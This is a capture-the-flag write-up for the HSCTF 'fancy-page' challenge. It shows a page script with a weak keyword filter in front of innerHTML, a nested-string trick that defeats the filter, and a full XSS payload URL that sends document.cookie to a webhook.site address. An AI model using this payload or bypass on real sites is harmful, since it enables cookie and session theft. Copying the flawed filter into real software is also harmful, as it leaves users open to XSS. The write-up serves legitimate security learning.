# fancy-page
> http://fancy-page.hsctf.com

## About the Challenge
We were given a source code (You can download the source code [here](fancy-page.zip)). Inside the source code there is a JavaScript file called `display.js`. Here is the content of the file

```js
import { default as Arg } from "https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm";

function sanitize(content) {
	return content.replace(/script|on|iframe|object|embed|cookie/gi, "");
}

let title = document.getElementById("title");
let content = document.getElementById("content");

function display() {
	title.textContent = Arg("title");
	document.title = Arg("title");

	let sanitized = sanitize(Arg("content"));
	content.innerHTML = sanitized;

	document.body.style.backgroundColor = Arg("background_color");
	document.body.style.color = Arg("color");
	document.body.style.fontFamily = Arg("font");
	content.style.fontSize = Arg("font_size") + "px";
}

display();
```

As you can see, this is a XSS challenge, but there is some sanitization applied to certain strings, such as `script`, `on`, `iframe`, `object`, `embed`, and `cookie`

## How to Solve?
To bypass the sanitization im using `string within a string`. For example

```
cookie => ""
coocookiekie => "cookie"
```

And here is the payload I used to solve this chall

```
http://fancy-page.hsctf.com/display.html?title=test&content=test%3Cimg/src/oonnerror%3Dlocatioonn.replace(%27https://webhook.site/bbd37165-3069-4602-8ffe-56a1c7e6a8a1%2F%3F%27%2Bdocument.coocookiekie)%3E&background_color=%23ffffff&color=%23000000&font=Helvetica&font_size=16
```

And then check webhook to obtain the flag


[Image extracted text: Request Details
Permalink
Raw content
Expont as
Headers
GET
https Ilwebhook site/bbd37165-3069-4602-8ffe-56a1c7e6a8a1/2flag-flag{filter_fail}
connection
close
Host
104.196.171.82 whois
accept-encoding
gz1p ,
deflate_
Date
06/05/2023 6.06.48 AM (6 days ago)
referer
http:/ /fancy-page.hsctf
com
Size
bytes
sec-fetch-dest
document
407e78db-082b-45ba-99f9-b6ab90c99416
sec-fetch-mode
navigate
sec-fetch-site
cross-site
Files
accept
text/html, application/xhtmltxml,application/xml;q-8
image/avif,imag
user-agent
Mozilla/5.
(X1l;
Linux
x86_64) ApplellebKit/537.36
(KHTML, like Gecko
upgrade-insecure-
requests
host
webhook.site
content-length
content-type
Query strings
Form values
flag
flag{filter_fail}
(empty )
No content]


```
flag{filter_fail}
```